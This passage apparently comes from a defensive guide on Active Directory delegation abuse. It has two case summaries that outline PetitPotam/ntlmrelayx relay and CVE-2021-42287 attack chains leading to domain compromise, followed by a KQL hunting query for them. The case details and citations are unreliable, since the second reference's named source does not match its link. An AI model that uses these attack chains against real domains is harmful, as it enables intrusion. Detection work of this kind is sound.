- **Target:** Fortune 500 financial company
- **Timeline:** March 2024
- **Technique Status:** RBCD via LDAP relay (Petitpotam + ntlmrelayx)
- **Impact:** Domain admin compromise, $2M+ ransomware payment
- **Reference:** [Netwrix Blog - RBCD Abuse](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)

**Attack Timeline:**
1. Compromised user account (phishing)
2. Enumerated RBCD-vulnerable DC
3. Used Petitpotam to coerce DC authentication to attacker's relay
4. ntlmrelayx automatically modified DC's RBCD attribute
5. Requested admin tickets via S4U
6. Lateral movement to file servers, databases
7. Ransomware deployment

---

### Example 2: CVE-2021-42287 + RBCD (SamAccountName Spoofing)

- **Target:** European government agency
- **Timeline:** November 2021
- **Technique Status:** Combined SamAccountName spoofing with RBCD for privilege escalation
- **Impact:** Full domain compromise
- **Reference:** [Elad Shamir – Dares Blog: SamAccountName Spoofing](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)

**Attack Sequence:**
1. Compromised machine account with write to DC RBCD
2. Used SamAccountName spoofing (CVE-2021-42287) to create DC impersonation
3. Exploited RBCD to request admin tickets
4. Accessed domain controller credentials

---

## 15. FORENSIC ANALYSIS & ADVANCED HUNTING

### Hunt for RBCD Exploitation (Sentinel KQL)

```kusto
SecurityEvent
| where EventID in (4768, 5136)
| where (EventID == 4768 and (TicketOptions contains "0x40800000" or TicketOptions contains "0x40810000"))
        or (EventID == 5136 and AttributeLDAPDisplayName contains "msDS-AllowedToActOnBehalfOfOtherIdentity")
| summarize Count = count() by TimeGenerated, TargetUserName, Computer, EventID
| where Count > 5  // Multiple S4U requests in short timeframe
| order by TimeGenerated desc
```

---